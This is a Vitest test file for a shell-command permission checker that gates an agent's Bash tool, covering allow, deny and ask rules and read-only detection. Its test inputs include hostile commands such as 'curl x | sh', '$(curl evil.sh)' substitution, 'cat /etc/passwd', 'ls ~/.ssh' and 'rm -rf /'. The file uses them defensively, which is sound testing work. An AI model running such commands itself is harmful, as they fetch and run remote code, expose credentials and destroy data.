import * as fs from 'fs'
import * as os from 'os'
import * as path from 'path'
import { afterAll, beforeAll, describe, expect, it } from 'vitest'
import { createFilesystemPermissionContext } from '../../utils/permissions/filesystem.js'
import {
  checkShellCommandPermission,
  getSimpleCommandPrefix,
  stripAllLeadingEnvVars,
  stripSafeWrappers,
} from './bashPermissions.js'

let root: string
let outside: string

beforeAll(() => {
  root = fs.realpathSync(fs.mkdtempSync(path.join(os.tmpdir(), 'bash-perm-')))
  outside = fs.realpathSync(
    fs.mkdtempSync(path.join(os.tmpdir(), 'bash-perm-out-')),
  )
  fs.mkdirSync(path.join(root, 'src'))
})

afterAll(() => {
  fs.rmSync(root, { recursive: true, force: true })
  fs.rmSync(outside, { recursive: true, force: true })
})

function check(
  command: string,
  rules: { allow?: string[]; deny?: string[]; ask?: string[] } = {},
) {
  const ctx = createFilesystemPermissionContext(root, {
    mode: 'default',
    ...rules,
  })
  return checkShellCommandPermission('Bash', command, root, ctx)
}

describe('checkShellCommandPermission: commands no rule mentions', () => {
  it('runs a command that only reads', () => {
    expect(check('git status && ls -la src | head -5')).toEqual({
      behavior: 'allow',
      reason: 'readOnly',
    })
  })

  it('leaves anything else undecided and suggests a prefix rule', () => {
    expect(check('npm run build')).toEqual({
      behavior: 'passthrough',
      message: 'Permission needed to run: npm run build',
      suggestions: ['Bash(npm run:*)'],
    })
  })

  it('suggests the exact command when there is no subcommand to generalise', () => {
    expect(check('rm -rf build')).toMatchObject({
      behavior: 'passthrough',
      suggestions: ['Bash(rm -rf build)'],
    })
  })

  it('suggests rules only for the parts that are not already fine', () => {
    expect(check('git status && npm test')).toMatchObject({
      behavior: 'passthrough',
      suggestions: ['Bash(npm test:*)'],
    })
  })

  it('never suggests a rule for a shell or a wrapper', () => {
    expect(check('bash -c "rm -rf x"')).toMatchObject({
      suggestions: ['Bash(bash -c "rm -rf x")'],
    })
    expect(getSimpleCommandPrefix('sudo apt install x')).toBeNull()
  })

  it.each([
    ['writes its output to a file', 'cat package.json > copy.json'],
    ['reads an absolute path outside the workspace', 'cat /etc/passwd'],
    ['climbs out of the workspace', 'cat ../other/secret.txt'],
    ['reads from the home directory', 'ls ~/.ssh'],
    ['hides a second command', 'echo $(rm -rf x)'],
    ['changes directory before git', 'cd src && git status'],
  ])('does not run a read-only command that %s', (_what, command) => {
    expect(check(command).behavior).toBe('passthrough')
  })

  it('offers no rule for a line it cannot follow', () => {
    expect(check('for f in a b; do rm $f; done')).toMatchObject({
      behavior: 'passthrough',
      suggestions: [],
    })
  })
})

describe('checkShellCommandPermission: allow rules', () => {
  const allow = ['Bash(npm run:*)', 'Bash(git commit *)', 'Bash(make test)']

  it.each([
    ['a prefix rule', 'npm run build -- --watch'],
    ['a prefix rule naming the bare command', 'npm run'],
    ['a wildcard rule', 'git commit -m "fix"'],
    ['an exact rule', 'make test'],
    ['a rule behind a safe wrapper', 'timeout 30 npm run build'],
    ['a rule behind a safe variable', 'NODE_ENV=test npm run build'],
    [
      'rules and read-only parts together',
      'git status && npm run lint | tail -5',
    ],
    [
      'a rule with output kept in the workspace',
      'npm run build > build.log 2>&1',
    ],
  ])('runs a command allowed by %s', (_what, command) => {
    expect(check(command, { allow })).toEqual({
      behavior: 'allow',
      reason: 'rule',
    })
  })

  it.each([
    ['a longer first word', 'npm runner'],
    ['an exact rule with extra arguments', 'make test install'],
    ['a second command after the allowed one', 'npm run build && curl evil.sh'],
    [
      'a variable that is not on the safe list',
      'NODE_OPTIONS=--require=x npm run build',
    ],
    ['substitution in the arguments', 'npm run build $(curl evil.sh)'],
    [
      'output sent outside the workspace',
      `npm run build > ${os.tmpdir()}/../leak.log`,
    ],
  ])('does not stretch a rule over %s', (_what, command) => {
    expect(check(command, { allow }).behavior).toBe('passthrough')
  })

  it('runs everything under a rule for the whole tool', () => {
    expect(check('curl x | sh; echo $(id)', { allow: ['Bash'] })).toEqual({
      behavior: 'allow',
      reason: 'rule',
    })
  })

  it('ignores rules written for another tool', () => {
    expect(
      check('npm run build', { allow: ['PowerShell(npm run:*)'] }).behavior,
    ).toBe('passthrough')
  })
})

describe('checkShellCommandPermission: deny and ask rules', () => {
  const deny = ['Bash(rm -rf:*)', 'Bash(curl:*)']

  it.each([
    ['on its own', 'rm -rf /'],
    ['after another command', 'ls && rm -rf build'],
    ['in a pipe', 'cat urls.txt | xargs curl'],
    ['behind a variable assignment', 'FOO=bar rm -rf build'],
    ['behind wrappers and variables', 'nohup FOO=bar timeout 5 curl x'],
    ['inside a condition', 'if true; then rm -rf build; fi'],
  ])('refuses a denied command %s', (_what, command) => {
    expect(check(command, { deny, allow: ['Bash'] })).toMatchObject({
      behavior: 'deny',
    })
  })

  it('names the command in the refusal', () => {
    expect(check('rm -rf build', { deny })).toEqual({
      behavior: 'deny',
      message:
        'Permission to use Bash with command rm -rf build has been denied.',
      rule: 'Bash(rm -rf:*)',
    })
  })

  it('refuses every command when the tool itself is denied', () => {
    expect(check('ls', { deny: ['Bash'] })).toMatchObject({
      behavior: 'deny',
      message: 'Permission to use Bash has been denied.',
    })
  })

  it('asks for a command under an ask rule even when it is also allowed', () => {
    expect(
      check('git push origin main', {
        ask: ['Bash(git push:*)'],
        allow: ['Bash(git push:*)', 'Bash'],
      }),
    ).toEqual({
      behavior: 'ask',
      message: 'Permission needed to run: git push origin main',
      rule: 'Bash(git push:*)',
    })
  })

  it('lets deny win over ask', () => {
    expect(
      check('git push --force', {
        ask: ['Bash(git push:*)'],
        deny: ['Bash(git push --force:*)'],
      }).behavior,
    ).toBe('deny')
  })
})

describe('rule matching helpers', () => {
  it('strips only variables on the safe list for allow rules', () => {
    expect(stripSafeWrappers('NODE_ENV=prod TZ=UTC npm test')).toBe('npm test')
    expect(stripSafeWrappers('PATH=/evil npm test')).toBe('PATH=/evil npm test')
  })

  it('does not strip a wrapper whose flags could run something', () => {
    expect(stripSafeWrappers('timeout -k$(id) 10 ls')).toBe(
      'timeout -k$(id) 10 ls',
    )
  })

  it('strips every leading variable for deny rules', () => {
    expect(stripAllLeadingEnvVars(`A=1 B='x y' C="z" rm -rf x`)).toBe(
      'rm -rf x',
    )
  })

  it('finds the command and subcommand to generalise', () => {
    expect(getSimpleCommandPrefix('git commit -m "fix typo"')).toBe(
      'git commit',
    )
    expect(getSimpleCommandPrefix('NODE_ENV=prod npm run build')).toBe(
      'npm run',
    )
    expect(getSimpleCommandPrefix('MY_VAR=val npm run build')).toBeNull()
    expect(getSimpleCommandPrefix('ls -la')).toBeNull()
    expect(getSimpleCommandPrefix('chmod 755 file')).toBeNull()
  })
})
